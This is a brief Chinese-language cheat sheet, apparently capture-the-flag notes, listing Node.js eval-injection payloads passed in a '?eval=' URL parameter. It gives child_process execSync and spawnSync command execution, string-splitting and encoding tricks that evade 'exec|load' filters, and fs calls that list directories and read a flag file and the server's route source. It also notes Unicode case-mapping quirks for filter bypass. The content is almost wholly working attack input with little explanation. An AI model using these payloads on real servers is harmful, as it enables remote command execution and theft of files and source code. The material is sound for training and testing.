## **函数特性**
```
Character.toUpperCase()函数，字符ı会转变为I，字符ſ会变为S
Character.toLowerCase()函数，字符İ会转变为i，字符K会转变为k
```


## **eval命令执行**

```
eval(require("child_process").execSync('ls'))


?eval=require("child_process").execSync('ls')

?eval=require('child_process').execSync('ls').toString()

?eval=require("child_process")['exe'%2B'cSync']('ls')

?eval=require('child_process').spawnSync( 'ls', [ './' ] ).stdout.toString()

?eval=global.process.mainModule.constructor._load('child_process').execSync('ls')
```
```
//读文件夹，读文件函数
?eval=require('fs').readdirSync(".")
?eval=require('fs').readFileSync('./fl00g.txt','utf8');
```
```
//字符串拼接
?eval=var s='global.process.mainModule.constructor._lo';var b="ad('child_process').ex";var c="ec(%27ls>public/1.txt%27);";eval(s%2Bb%2Bc)%3B
```

^
有过滤exec|load
```
构造exec
?eval=require("child_process")['exe'%2B'cSync']('ls')

?eval=require( 'child_process' ).spawnSync( 'ls', [ '.' ] ).stdout.toString()
?eval=require( 'child_process' ).spawnSync( 'cat', [ 'f*' ] ).stdout.toString()
```

查看目录和源码
```
?eval=__filename 可以看到路径为/app/routes/index.js 
?eval=__dirname  看到/app/routes/
?eval=require('fs').readFileSync('/app/routes/index.js', 'utf-8')   查看源码
```

